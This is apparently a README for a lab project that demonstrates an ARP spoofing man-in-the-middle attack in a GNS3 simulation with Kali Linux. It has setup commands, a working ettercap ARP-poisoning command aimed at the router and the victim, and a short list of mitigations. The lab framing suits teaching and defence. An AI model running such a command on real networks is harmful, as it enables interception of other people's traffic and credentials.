
# ARP Spoofing and ARP Poisoning

## Description

This project demonstrates the implementation of a man-in-the-middle (MITM) attack using ARP Spoofing and ARP Poisoning. The simulation is performed with GNS3 and Kali Linux.

## Table of Contents

- [Introduction](#introduction)
- [Requirements](#requirements)
- [Environment Setup](#environment-setup)
- [Procedure](#procedure)
  - [Router Configuration](#router-configuration)
  - [Virtual Machine Configuration](#virtual-machine-configuration)
  - [Executing the Attack](#executing-the-attack)
- [Results Analysis](#results-analysis)
- [Protection and Mitigation Mechanisms](#protection-and-mitigation-mechanisms)
- [Conclusions](#conclusions)

## Introduction

In this presentation, we explore the concept of a man-in-the-middle (MITM) attack, how the ARP protocol works, and how it can be exploited through ARP poisoning.

## Requirements

- GNS3
- Kali Linux
- Router and victim machine in the simulation
- Network tools (Wireshark, ettercap, etc.)

## Environment Setup

1. **Install GNS3 and perform basic configuration.**
2. **Install Kali Linux as a virtual machine.**
3. **Configure the router and virtual machines in GNS3.**

## Procedure

### Router Configuration

Configure the router to allow communication between the victim machine and the attacker.

```bash
# Example command to configure the router
configure terminal
interface FastEthernet0/0
ip address 192.168.1.1 255.255.255.0
no shutdown
exit
```

[Image Placeholder]

### Virtual Machine Configuration

#### Victim Machine

Configure the victim machine to have an IP address in the same subnet as the router.

```bash
# Example command to configure the IP on the victim machine
ifconfig eth0 192.168.1.2 netmask 255.255.255.0
```

#### Attacker Machine (Kali Linux)

Configure the attacker machine with an IP address in the same subnet and prepare the necessary tools.

```bash
# Example command to configure the IP on Kali Linux
ifconfig eth0 192.168.1.3 netmask 255.255.255.0
```

### Executing the Attack

Use tools like `ettercap` or `arpspoof` to carry out the MITM attack.

```bash
# Example command to start ARP Spoofing with ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.2//
```

[Image Placeholder]

## Results Analysis

Analyze the captured packets with Wireshark to verify the success of the attack.

[Image Placeholder]

## Protection and Mitigation Mechanisms

- Implementation of Access Control Lists (ACLs).
- Use of static ARP entries.
- Implementing switch security features (port security).

## Conclusions

ARP Spoofing attacks can have serious consequences for network security. It is essential to implement protection and mitigation measures to prevent these attacks.

[Image Placeholder]

---

## References

1. [GNS3 Official Documentation](https://www.gns3.com/)
2. [Kali Linux Official Documentation](https://www.kali.org/docs/)
